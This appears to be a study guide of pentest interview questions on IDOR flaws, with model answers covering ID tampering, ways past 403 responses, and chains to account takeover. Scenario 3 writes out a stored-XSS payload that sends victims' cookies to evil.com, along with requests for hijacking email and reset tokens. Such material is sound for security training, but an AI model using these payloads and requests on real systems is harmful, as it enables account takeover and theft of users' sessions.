# 🔓 IDOR (Insecure Direct Object Reference) — Interview Scenarios

> *"IDOR is the most common bug in real pentests. It's simple to find, but the thinking behind it shows your depth."*

---

## Scenario 1: Classic IDOR (Medium)

**🎯 Interviewer:** "You're logged in as a normal user. You view your profile at `/api/users/1042`. How do you check for IDOR?"

### ✅ Model Answer:

"IDOR occurs when the server uses a user-supplied identifier to fetch a resource but doesn't verify ownership. My approach:

**Step 1 — Identify the object reference:** The `1042` in `/api/users/1042` is my user ID.

**Step 2 — Test with another user's ID:**
```
GET /api/users/1041   → Do I see another user's profile?
GET /api/users/1043   → Same test with adjacent ID
GET /api/users/1      → Often the admin account
```

**Step 3 — Test with different HTTP methods:**
```
GET /api/users/1041    → Can I READ their data?
PUT /api/users/1041    → Can I MODIFY their data?
DELETE /api/users/1041 → Can I DELETE their account?
```

**Step 4 — Check the response carefully.** Sometimes the server returns 200 OK but with empty data (false positive). I compare the response structure and content between my own ID and others'.

**Step 5 — Test boundary values:**
```
GET /api/users/0       → Error handling
GET /api/users/-1      → Unexpected behavior
GET /api/users/9999999 → Non-existent user
```

The key question is: **Is the authorization check happening on the server, or is it just 'security through obscurity' by not showing the link in the UI?**"

### 🔥 Follow-ups:

**Q: "What if the ID is a UUID like `/api/users/a3f9e2b1-c4d5-4e6f-8a7b-1234567890ab`?"**

> "UUIDs are harder to guess but NOT a security measure:
> 1. Check if UUIDs are leaked elsewhere — in API responses, HTML source, public profiles, other endpoints
> 2. Some UUIDs are version 1 (time-based) — they're predictable if you know the creation time and MAC address
> 3. Register two accounts and compare UUIDs — if they're sequential or have patterns, they're guessable
> 4. Check if other endpoints leak UUIDs: `/api/comments` might show author UUIDs
> 5. The proper fix is authorization checks, NOT unguessable IDs"

**Q: "The API returns 403 Forbidden when you try another user's ID. Is IDOR definitively not present?"**

> "Not necessarily. I'd test:
> 1. **HTTP method switching** — 403 on GET but works on POST/PUT?
> 2. **Parameter pollution** — `/api/users/1042?id=1041` — does the query param override?
> 3. **Wrapping in array** — `{"id": [1041, 1042]}` — some parsers take the first or last
> 4. **Different content type** — Change from JSON to XML or form-urlencoded
> 5. **Path traversal in ID** — `/api/users/1042/../1041`
> 6. **Add your own ID alongside** — Some APIs check if YOUR id is in the request but process ALL ids"

---

## Scenario 2: IDOR in Non-Obvious Locations (Medium-Hard)

**🎯 Interviewer:** "IDOR isn't always in the URL. Where else would you look?"

### ✅ Model Answer:

| Location | Example | What to Test |
|----------|---------|--------------|
| **Request body** | `{"user_id": 1042, "action": "view"}` | Change `user_id` to 1041 |
| **Cookies** | `user=1042` | Change cookie value |
| **Headers** | `X-User-ID: 1042` | Modify header value |
| **File paths** | `/download?file=report_1042.pdf` | Try `report_1041.pdf` |
| **Email params** | `/send-receipt?email=me@test.com` | Change to `victim@test.com` |
| **Nested objects** | `{"order": {"owner_id": 1042}}` | Modify nested ID |
| **GraphQL** | `query { user(id: 1042) }` | Change ID in query |
| **Websockets** | `{"subscribe": "user_1042_notifications"}` | Subscribe to `user_1041` |

**The most overlooked IDOR locations:**

1. **Receipts/invoices/reports** — download endpoints often don't check ownership
2. **Password reset tokens** — if you can see/modify whose token is generated
3. **Support tickets** — `/ticket/5533` — view other users' support conversations
4. **File attachments** — `/attachment?id=887` — access files from other users' tickets
5. **Order status/tracking** — shipping info of other customers"

---

## Scenario 3: IDOR Leading to Account Takeover (Hard)

**🎯 Interviewer:** "You found an IDOR that lets you read other users' data. How would you escalate this to full account takeover?"

### ✅ Model Answer:

"IDOR → Account Takeover chains:

**Chain 1: IDOR on email change endpoint**
```
PUT /api/users/1041 
{"email": "attacker@evil.com"}
```
Then trigger password reset → reset link goes to MY email → full takeover.

**Chain 2: IDOR exposes password reset tokens**
```
GET /api/users/1041/reset-tokens
→ Returns the active password reset token
→ Use it directly: /reset-password?token=abc123
```

**Chain 3: IDOR exposes API keys or session tokens**
```
GET /api/users/1041
→ Response includes: {"api_key": "sk_live_xxx", "session": "eyJ..."}
→ Use the session token or API key directly
```

**Chain 4: IDOR on role/permission change**
```
PUT /api/users/1042  (my own account)
{"role": "admin"}
→ If the server accepts this field, I've escalated to admin
→ Now I have legitimate admin access to everything
```

**Chain 5: IDOR + Stored XSS combo**
```
PUT /api/users/1041
{"bio": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
→ Injected XSS into victim's profile
→ Anyone viewing their profile gets hit
```

The key insight: **IDOR is rarely the end — it's usually the beginning of a chain. Always ask 'what can I do with this access?'**"

---

## Scenario 4: Horizontal vs Vertical IDOR (Medium)

**🎯 Interviewer:** "Explain the difference between horizontal and vertical privilege escalation with IDOR examples."

### ✅ Model Answer:

"**Horizontal escalation** — accessing another user's resources at the SAME privilege level:
```
User A views: GET /api/orders/555  (User A's order)
User A tests: GET /api/orders/556  (User B's order) → Success!
Same privilege, different user's data.
```

**Vertical escalation** — accessing resources of a HIGHER privilege level:
```
Normal user: GET /api/admin/users  → 403
Normal user: GET /api/v1/admin/users  → 200 (older API, no auth check)
Or: GET /api/users?role=admin  → returns admin users with their data
```

**Real-world example showing both:**

I'm testing a project management app:
1. **Horizontal:** I change project ID in `/api/projects/42/files` to see another team's files → works → horizontal IDOR
2. **Vertical:** I notice admin has endpoint `/api/projects/42/settings`. I try it with my regular user token → works → vertical escalation
3. **Chain:** I modify the project settings to add myself as project admin, then I have legitimate elevated access

| Type | What changes | Impact |
|------|-------------|--------|
| Horizontal | Object ID (same role) | Data breach of peers |
| Vertical | Function access (higher role) | Privilege escalation |
| Both combined | ID + elevated functions | Full system compromise |"

---

## Quick Recall — IDOR Cheat Sheet

```
WHERE TO LOOK:
  URLs:          /api/resource/{id}
  Request body:  {"user_id": X, "order_id": Y}
  Cookies:       user_id=X
  Headers:       X-User-ID, X-Account-ID
  File paths:    /download?file=report_{id}.pdf
  GraphQL:       query { user(id: X) {...} }

WHAT TO TRY:
  Adjacent IDs:  id-1, id+1
  First user:    id=1 (often admin)
  Your other account: (register 2 accounts, cross-test)
  HTTP methods:  GET → PUT → DELETE on same resource
  Batch/array:   {"ids": [your_id, victim_id]}

ESCALATION:
  Read → Write (can you modify, not just view?)
  Write → Delete (can you destroy?)
  Data → Account (email change → password reset)
  User → Admin (role parameter, admin endpoints)

BYPASS 403:
  Method switching (GET→POST)
  Parameter pollution (?id=yours&id=theirs)
  Path traversal (/yours/../theirs)  
  API version downgrade (/v2→/v1)
  Content-Type change
  Case change in path (/Users vs /users)
```

---

> **Practice:** Create two accounts on any test app. Try to access Account B's data while logged in as Account A. Document every endpoint where it works.
